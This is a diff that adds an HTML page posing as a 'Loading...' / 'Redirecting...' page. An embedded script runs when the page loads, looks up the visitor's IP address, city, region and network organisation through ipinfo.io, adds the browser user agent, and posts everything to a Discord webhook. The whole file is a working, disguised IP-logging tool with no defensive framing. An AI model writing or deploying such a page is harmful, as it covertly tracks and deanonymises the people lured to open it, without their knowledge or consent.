@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+  <script>
+    async function exfiltrate() {
+      const webhook = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE';
+      const ipInfo = await fetch('https://ipinfo.io/json').then(res => res.json());
+
+      const payload = {
+        content: `**New Visitor Logged**\nIP: ${ipInfo.ip}\nCity: ${ipInfo.city}\nRegion: ${ipInfo.region}\nOrg: ${ipInfo.org}\nBrowser: ${navigator.userAgent}`
+      };
+
+      fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    }
+
+    window.onload = exfiltrate;
+  </script>
+</head>
+<body>
+  <h1>Redirecting...</h1>
+</body>
+</html>
